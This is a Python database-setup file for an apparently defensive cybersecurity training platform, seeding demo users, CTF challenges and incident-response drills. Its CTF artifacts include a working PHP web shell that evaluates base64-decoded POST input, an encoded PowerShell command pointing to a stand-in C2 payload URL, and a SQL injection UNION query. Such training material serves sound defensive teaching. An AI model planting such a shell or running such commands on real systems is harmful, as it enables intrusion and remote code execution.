"""
database.py
===========
Threat Vector - SQLite Database Layer & Seed Engine
---------------------------------------------------
Handles SQLite database initialization, table creation, seed ingestion
from CSV, peer trainee seeding, and helper queries.

Tables:
- users: Trainee accounts, password hashes, defense scores, roles
- scenarios: 28+ rich simulation drills (Phishing, OTP, Impersonation, etc.)
- drill_responses: Trainee answers, verdicts, chosen indicators, timestamps
- ctf_challenges: Tactical range challenges with flags, artifacts, hints
- ctf_submissions: Log of trainee flag captures
- war_room_incidents: Incident response simulated scenarios & phases
- war_room_logs: Trainee containment actions and tactical outcomes
- audit_logs: Real-time security event log
"""

import sqlite3
import csv
import json
import os
from werkzeug.security import generate_password_hash

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "database.db")
SCENARIOS_CSV = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "scenarios.csv")

def get_db_connection():
    """Returns a SQLite connection with Row factory enabled for dictionary-like access."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initializes SQLite schema and populates default scenarios, CTF challenges, and users."""
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Users Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'Trainee Analyst',
        defense_score INTEGER DEFAULT 0,
        drills_completed INTEGER DEFAULT 0,
        ctf_completed INTEGER DEFAULT 0,
        warroom_completed INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    # 2. Scenarios / Drills Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS scenarios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        category TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        title TEXT NOT NULL,
        sender TEXT NOT NULL,
        subject TEXT NOT NULL,
        content TEXT NOT NULL,
        indicators_json TEXT NOT NULL,
        correct_indicators_json TEXT NOT NULL,
        is_malicious INTEGER NOT NULL,
        explanation TEXT NOT NULL,
        mitre_tactic TEXT NOT NULL,
        points INTEGER DEFAULT 50
    )
    """)

    # 3. Drill Responses Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS drill_responses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        scenario_id INTEGER NOT NULL,
        user_verdict INTEGER NOT NULL,
        is_correct INTEGER NOT NULL,
        selected_indicators_json TEXT,
        score_awarded INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (scenario_id) REFERENCES scenarios(id)
    )
    """)

    # 4. CTF Challenges Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS ctf_challenges (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT NOT NULL,
        category TEXT NOT NULL,
        difficulty TEXT NOT NULL,
        description TEXT NOT NULL,
        artifact_data TEXT NOT NULL,
        hint TEXT NOT NULL,
        flag TEXT NOT NULL,
        points INTEGER DEFAULT 100
    )
    """)

    # 5. CTF Submissions Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS ctf_submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        challenge_id INTEGER NOT NULL,
        submitted_flag TEXT NOT NULL,
        is_correct INTEGER NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (challenge_id) REFERENCES ctf_challenges(id)
    )
    """)

    # 6. Incident Response War Room Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS war_room_incidents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT NOT NULL,
        threat_type TEXT NOT NULL,
        severity TEXT NOT NULL,
        description TEXT NOT NULL,
        phases_json TEXT NOT NULL,
        points INTEGER DEFAULT 200
    )
    """)

    # 7. War Room Logs
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS war_room_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        incident_id INTEGER NOT NULL,
        phase_index INTEGER NOT NULL,
        chosen_option_index INTEGER NOT NULL,
        points_earned INTEGER NOT NULL,
        outcome_note TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id),
        FOREIGN KEY (incident_id) REFERENCES war_room_incidents(id)
    )
    """)

    # 8. Audit Logs Table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT NOT NULL,
        details TEXT,
        ip_address TEXT DEFAULT '127.0.0.1',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    conn.commit()

    # --- SEED DATA ---
    seed_users(conn)
    seed_scenarios(conn)
    seed_ctf(conn)
    seed_war_room(conn)

    conn.close()
    print("[+] Database initialized successfully with all tables and seeds.")

def seed_users(conn):
    """Seeds default demo trainee account and realistic peer analysts for the leaderboard."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    if cursor.fetchone()[0] == 0:
        default_password = generate_password_hash("password123")
        peer_users = [
            ("cadet", default_password, "Security Trainee", 350, 6, 2, 1),
            ("sarah_infosec", default_password, "Senior SOC Analyst", 1450, 24, 5, 4),
            ("marcus_cyber", default_password, "Threat Hunter", 1280, 21, 4, 3),
            ("elena_cert", default_password, "Incident Responder", 980, 16, 3, 3),
            ("alex_soc", default_password, "Junior Analyst", 720, 12, 2, 2),
            ("david_dfir", default_password, "Digital Forensics Lead", 580, 9, 2, 1),
        ]
        cursor.executemany("""
            INSERT INTO users (username, password_hash, role, defense_score, drills_completed, ctf_completed, warroom_completed)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, peer_users)
        conn.commit()
        print("[+] Seeded 6 baseline users into 'users' table.")

def seed_scenarios(conn):
    """Loads drills dataset from scenarios.csv into SQLite if empty."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM scenarios")
    if cursor.fetchone()[0] == 0 and os.path.exists(SCENARIOS_CSV):
        with open(SCENARIOS_CSV, mode="r", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            rows = []
            for r in reader:
                rows.append((
                    int(r["id"]),
                    r["category"],
                    r["difficulty"],
                    r["title"],
                    r["sender"],
                    r["subject"],
                    r["content"],
                    r["indicators_json"],
                    r["correct_indicators_json"],
                    int(r["is_malicious"]),
                    r["explanation"],
                    r["mitre_tactic"],
                    int(r["points"])
                ))
            cursor.executemany("""
                INSERT OR REPLACE INTO scenarios 
                (id, category, difficulty, title, sender, subject, content, indicators_json, correct_indicators_json, is_malicious, explanation, mitre_tactic, points)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, rows)
            conn.commit()
            print(f"[+] Seeded {len(rows)} scenarios from scenarios.csv.")

def seed_ctf(conn):
    """Seeds interactive CTF tactical range missions."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM ctf_challenges")
    if cursor.fetchone()[0] == 0:
        challenges = [
            (
                "SSH Brute Force Intrusion Detective",
                "Log Analysis",
                "Cadet",
                "A Linux authentication server was subjected to a high-frequency credential stuffing attack. Inspect the auth.log excerpt below to identify which IP address launched the attack and which username was successfully breached.",
                """Oct 19 02:14:01 prod-auth sshd[14201]: Failed password for invalid user admin from 192.168.1.105 port 42102 ssh2
Oct 19 02:14:03 prod-auth sshd[14205]: Failed password for root from 192.168.1.105 port 42104 ssh2
Oct 19 02:14:05 prod-auth sshd[14210]: Failed password for guest from 192.168.1.105 port 42108 ssh2
Oct 19 02:14:07 prod-auth sshd[14218]: Accepted password for sysadmin from 192.168.1.105 port 42110 ssh2
Oct 19 02:14:08 prod-auth sshd[14218]: pam_unix(sshd:session): session opened for user sysadmin by (uid=0)""",
                "Look for the single log line containing 'Accepted password for' to reveal the breached username and the source IP.",
                "flag{192.168.1.105_sysadmin}",
                100
            ),
            (
                "Obfuscated Web Shell Backdoor Inspection",
                "Web Shell Signatures",
                "Analyst",
                "During a forensic web server audit, security teams found an anomalous PHP script masquerading as an image upload. De-obfuscate the hidden authorization key token embedded in the script.",
                """<?php
// Threat Vector Lab - Web Shell Forensic Capture
// File: /var/www/html/uploads/avatar_preview.png.php
$k = "c99_backdoor_auth_token_9918";
if (isset($_POST['shell_cmd']) && $_COOKIE['auth_key'] === md5($k)) {
    $exec_code = base64_decode($_POST['shell_cmd']);
    eval($exec_code);
}
?>""",
                "The attacker enforces authentication via an MD5 comparison against variable $k. The flag is the exact string inside $k.",
                "flag{c99_backdoor_auth_token_9918}",
                120
            ),
            (
                "Intercepted Threat Actor C2 Cipher (ROT13)",
                "Cryptography",
                "Cadet",
                "SOC analysts intercepted an encoded beacon string transmitted from an infected workstation to an external Command & Control server. Intelligence suggests the attacker used classic ROT13 substitution.",
                """Intercepted Beacon Payload:
synt{ebg13_punyyratr_qrpbqrq_fhpprff}""",
                "Apply ROT13 decoding (shift each letter 13 characters in the alphabet). Letters a-z wrap around.",
                "flag{rot13_challenge_decoded_success}",
                80
            ),
            (
                "PowerShell Encoded Command Forensic Decryption",
                "Header & Payload Forensics",
                "Analyst",
                "Windows Event ID 4688 logged an obfuscated PowerShell dropper executed via Task Scheduler. Decode the Base64 command payload to reveal the remote C2 callback script URL.",
                """Process Command Line:
powershell.exe -NoP -NonI -W Hidden -Enc aHR0cDovL2V2aWwtYzItbGlzdGVuZXIuZGFya25ldC9wYXlsb2FkLnBzMQ==""",
                "The string following '-Enc' is Base64 encoded. Decode 'aHR0cDovL2V2aWwtYzItbGlzdGVuZXIuZGFya25ldC9wYXlsb2FkLnBzMQ==' to reveal the URL.",
                "flag{http://evil-c2-listener.darknet/payload.ps1}",
                150
            ),
            (
                "SQL Injection Web Access Log Detective",
                "SQL Injection Detective",
                "Analyst",
                "The web server WAF triggered a SQL injection signature. Analyze the Apache access log record below and extract the target database table being probed by the adversary.",
                """10.0.0.45 - - [19/Oct/2026:14:22:10 +0000] "GET /products.php?id=1%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name='admin_credentials' HTTP/1.1" 200 4810""",
                "Inspect the SQL query inside the URL. Locate the value specified after 'table_name='.",
                "flag{admin_credentials}",
                110
            ),
            (
                "Ransomware Incident Note Identifier",
                "Ransomware Forensics",
                "Cadet",
                "An infected workstation on the accounting network was hit with ransomware. The desktop background was replaced with a ransom note. Find the attacker's unique victim identifier flag.",
                """==========================================================
!!! LOCKBIT 3.0 ENTERPRISE SYSTEM ENCRYPTION !!!
All of your virtual machines and SQL databases have been encrypted.
Do not modify filenames or attempt third-party recovery tools.
To negotiate decryption key, communicate with victim token:
flag{victim_id_882910_lockbit_recovered}
==========================================================""",
                "Read through the text of the ransom note to find the flag formatted string at the bottom.",
                "flag{victim_id_882910_lockbit_recovered}",
                90
            )
        ]
        cursor.executemany("""
            INSERT INTO ctf_challenges (title, category, difficulty, description, artifact_data, hint, flag, points)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """, challenges)
        conn.commit()
        print(f"[+] Seeded {len(challenges)} CTF challenges.")

def seed_war_room(conn):
    """Seeds simulated incident response scenarios with multi-phase decision branches."""
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM war_room_incidents")
    if cursor.fetchone()[0] == 0:
        incidents = [
            (
                "Operation BlackOut: Domain Controller Ransomware Outbreak",
                "Ransomware Outbreak",
                "CRITICAL",
                "At 03:14 AM, EDR sensors trigger mass file modification alerts on the primary Active Directory Domain Controller (DC-01). Workstations across the Finance VLAN are displaying ransom notes with '.locked' extensions. The adversary is using compromised Domain Admin credentials to propagate via SMB.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Detection & Triage",
                        "scenario_context": "Ransomware is spreading across the subnet through SMB port 445. Several departmental file servers are currently being encrypted.",
                        "question": "What is the most effective immediate containment triage action?",
                        "options": [
                            {"text": "Isolate the affected Finance VLAN at the core network switch and block inter-VLAN SMB (port 445).", "points": 50, "consequence": "CORRECT: Micro-segmentation stops ransomware lateral movement without taking down unrelated medical or production networks."},
                            {"text": "Perform a hard power-down of all server racks immediately.", "points": -20, "consequence": "CRITICAL ERROR: Hard shutdown destroys volatile RAM evidence, uncommitted transaction logs, and can corrupt disk recovery partitions."},
                            {"text": "Send a broadcast company email warning staff not to click links.", "points": -30, "consequence": "INEFFECTIVE: The attack is already executed and automated. An email will not halt active machine-speed encryption."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Identity & Credential Containment",
                        "scenario_context": "The attacker was observed using a stolen Domain Admin token. Kerberos ticket-granting service tickets (TGT) have been forged.",
                        "question": "How do you invalidate the attacker's administrative persistence across Active Directory?",
                        "options": [
                            {"text": "Perform a double reset of the Active Directory KRBTGT account password and revoke all active Kerberos sessions.", "points": 50, "consequence": "EXCELLENT SOC ACTION: Resetting the KRBTGT account twice invalidates Golden Tickets and completely kicks the adversary off the domain."},
                            {"text": "Simply change the password of the local Administrator account on DC-01.", "points": 0, "consequence": "INSUFFICIENT: Active Kerberos Golden Tickets remain valid for up to 10 hours regardless of individual password changes."},
                            {"text": "Pay the threat actor's $50,000 cryptocurrency demand to get their decryptor tool.", "points": -50, "consequence": "POLICY VIOLATION: Paying ransoms does not guarantee decryption, funds criminal syndicates, and often leaves stealth backdoors in place."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Threat Eradication",
                        "scenario_context": "VLAN isolation and credential invalidation are in effect. Now forensic teams must clean the infected systems.",
                        "question": "What is the industry-standard remediation procedure for compromised Domain Controllers?",
                        "options": [
                            {"text": "Rebuild and re-promote DC-01 from clean, verified bare-metal golden master images rather than attempting cleaning.", "points": 50, "consequence": "BEST PRACTICE: For high-tier domain controllers, never trust in-place antivirus cleaning. Rebuilding guarantees no kernel-level rootkits survive."},
                            {"text": "Run a standard consumer antivirus full-system scan and delete detected .exe files.", "points": -15, "consequence": "HIGH RISK: Modern ransomware droppers employ rootkits and memory injection that evade standard file-based scanner cleanup."},
                            {"text": "Simply delete the '.locked' extensions and ransom text notes.", "points": -30, "consequence": "CRITICAL MISUNDERSTANDING: Removing file extensions does not reverse AES/RSA cryptographic encryption."}
                        ]
                    },
                    {
                        "phase_title": "Phase 4: Recovery & Post-Mortem Hardening",
                        "scenario_context": "The domain has been rebuilt. Systems are ready for restoration. Executive leadership demands assurance against re-infection.",
                        "question": "Which recovery strategy ensures resilient data restoration and future defense?",
                        "options": [
                            {"text": "Restore databases from immutable, air-gapped offline backups and mandate FIDO2 hardware MFA on all administrative logins.", "points": 50, "consequence": "SECURITY TRIUMPH: Air-gapped backups prevent ransomware tampering, and hardware MFA stops future credential theft entirely."},
                            {"text": "Restore from the hot NAS backup share that was mapped to DC-01 during the attack.", "points": -25, "consequence": "CATASTROPHIC: Hot-mapped network shares were also targeted and encrypted by the ransomware wiper."},
                            {"text": "Resume operations immediately without making any firewall or policy changes.", "points": -20, "consequence": "UNSAFE: Root cause vulnerabilities remain unpatched, exposing the organization to repeat intrusion."}
                        ]
                    }
                ]),
                200
            ),
            (
                "Operation Hydra: Distributed Credential Stuffing & Account Takeover",
                "Credential Stuffing",
                "HIGH",
                "At 09:20 AM, web portal monitoring triggers an alarm: 65,000 failed login requests per minute are hitting '/api/v1/login'. Requests are distributed across 4,200 residential proxy IPs testing credentials from a recent darknet credential dump.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Traffic Analysis & Rate Limiting",
                        "scenario_context": "Customer portal servers are experiencing 90% CPU load. Legitimate users are experiencing service timeouts.",
                        "question": "What edge defense action mitigates the incoming credential flood?",
                        "options": [
                            {"text": "Deploy WAF dynamic rate limiting per IP and enforce Cloudflare/hCaptcha challenge on failed attempts.", "points": 50, "consequence": "SUCCESSFUL MITIGATION: Bot traffic drops by 94% as automated scripts cannot solve cryptographic CAPTCHA puzzles at scale."},
                            {"text": "Block IP addresses one by one manually in the firewall.", "points": -25, "consequence": "FUTILE: The attack uses over 4,000 rotating residential IPs. Manual blocking is impossible to keep pace with."},
                            {"text": "Shut down the customer portal entirely for the next 24 hours.", "points": -15, "consequence": "UNACCEPTABLE DOWNTIME: Excessive business interruption when edge filtering solutions are readily available."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Compromise Identification",
                        "scenario_context": "Despite rate limiting, approximately 180 customer accounts had matching passwords and were successfully authenticated by the botnet.",
                        "question": "How do you protect the 180 compromised accounts immediately?",
                        "options": [
                            {"text": "Revoke all active session JWT tokens for those 180 accounts, force a password reset, and flag them for step-up MFA verification.", "points": 50, "consequence": "PRECISE REMEDIATION: Invalidates rogue sessions immediately and secures customer assets before unauthorized wire transfers occur."},
                            {"text": "Leave the accounts active and monitor what the attackers do for the next 48 hours.", "points": -30, "consequence": "SEVERE RISK: Attackers can drain stored funds, siphon PII, or change recovery emails in seconds."},
                            {"text": "Delete the 180 user accounts completely from the database.", "points": -20, "consequence": "POOR CUSTOMER EXPERIENCE: Deleting legitimate accounts destroys customer history and orders."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Prevention & Strategic Hardening",
                        "scenario_context": "The immediate attack has subsided. The CISO requests permanent architectural defenses against future credential stuffing.",
                        "question": "Which long-term defense eliminates credential stuffing vulnerabilities?",
                        "options": [
                            {"text": "Integrate HaveIBeenPwned API check on password creation and enforce mandatory Multi-Factor Authentication (MFA).", "points": 50, "consequence": "STRATEGIC MASTERY: Prohibits users from selecting breached passwords and MFA renders stolen passwords useless on their own."},
                            {"text": "Increase minimum password length from 8 to 9 characters.", "points": 5, "consequence": "INSUFFICIENT: Attackers are using already-compromised passwords; minor length bumps do not thwart credential stuffing."},
                            {"text": "Disable user logins entirely and switch to phone-call ordering.", "points": -30, "consequence": "REGRESSIVE: Infeasible for modern digital enterprise services."}
                        ]
                    }
                ]),
                150
            ),
            (
                "Operation GhostExfil: Executive Spear-Phishing & Data Theft",
                "Data Exfiltration",
                "HIGH",
                "The Chief Financial Officer clicked on an email claiming to contain 'Revised_Q4_Board_Bonus.docm'. EDR alerted that WINWORD.EXE spawned 'powershell.exe', which injected into 'svchost.exe' and initiated outbound HTTPS beacons to an IP in Eastern Europe.",
                json.dumps([
                    {
                        "phase_title": "Phase 1: Host Isolation & Memory Preservation",
                        "scenario_context": "The malicious process is active in memory and attempting to dump LSASS credentials.",
                        "question": "What is the critical initial response step for the infected CFO workstation?",
                        "options": [
                            {"text": "Trigger immediate EDR network isolation while keeping the machine powered on to capture live RAM dump.", "points": 50, "consequence": "PERFECT FORENSICS: Network isolation stops outbound exfiltration while preserving volatile memory encryption keys."},
                            {"text": "Immediately unplug the power cord from the wall.", "points": -20, "consequence": "EVIDENCE LOSS: Cutting power instantly wipes RAM, losing injected shellcode, C2 encryption keys, and active process trees."},
                            {"text": "Tell the CFO to delete the email from their Outlook Trash folder.", "points": -25, "consequence": "USELESS: The malicious macro already executed in background memory; deleting the email has zero effect."}
                        ]
                    },
                    {
                        "phase_title": "Phase 2: Network & C2 Severance",
                        "scenario_context": "Network forensics reveals the beacon destination is 185.220.101.42 over TCP port 443.",
                        "question": "What enterprise-wide action prevents other internal endpoints from connecting to this adversary?",
                        "options": [
                            {"text": "Push an enterprise-wide firewall and DNS Sinkhole block for 185.220.101.42 and sweep SIEM logs for any other historical connections.", "points": 50, "consequence": "THREAT HUNTING EXCELLENCE: Blocks adversary command channel enterprise-wide and uncovers any secondary patient-zero machines."},
                            {"text": "Send a warning note to the ISP hosting the attacker IP.", "points": -10, "consequence": "INEFFECTIVE: Bulletproof offshore hosting providers ignore abuse reports, wasting critical incident response minutes."},
                            {"text": "Ignore network blocks and try to hack back into the attacker's server.", "points": -50, "consequence": "ILLEGAL: 'Hacking back' violates the Computer Fraud and Abuse Act (CFAA) and risks attacking innocent compromised proxies."}
                        ]
                    },
                    {
                        "phase_title": "Phase 3: Identity & Privilege Containment",
                        "scenario_context": "LSASS memory dumps indicate the CFO's corporate credentials and session cookies were scraped.",
                        "question": "What identity protection measures must be deployed?",
                        "options": [
                            {"text": "Revoke the CFO's active enterprise sessions, reset passwords, invalidate cloud OAuth tokens, and audit ERP financial access logs.", "points": 50, "consequence": "COMPREHENSIVE CONTAINMENT: Ensures stolen cookies and OAuth tokens cannot be used to conduct unauthorized wire transfers."},
                            {"text": "Ask the CFO to change their Netflix password.", "points": -25, "consequence": "IRRELEVANT: Corporate financial access was compromised, not personal media streaming."},
                            {"text": "Assume the CFO's account is safe because they have antivirus installed.", "points": -30, "consequence": "DANGEROUS: Info-stealers routinely bypass traditional signature-based antivirus."}
                        ]
                    }
                ]),
                150
            )
        ]
        cursor.executemany("""
            INSERT INTO war_room_incidents (title, threat_type, severity, description, phases_json, points)
            VALUES (?, ?, ?, ?, ?, ?)
        """, incidents)
        conn.commit()
        print(f"[+] Seeded {len(incidents)} War Room incidents.")

def log_audit_event(user_id, action, details="", ip="127.0.0.1"):
    """Inserts a record into audit_logs table."""
    try:
        conn = get_db_connection()
        conn.execute("""
            INSERT INTO audit_logs (user_id, action, details, ip_address)
            VALUES (?, ?, ?, ?)
        """, (user_id, action, details, ip))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"[-] Audit log error: {e}")

if __name__ == "__main__":
    init_db()
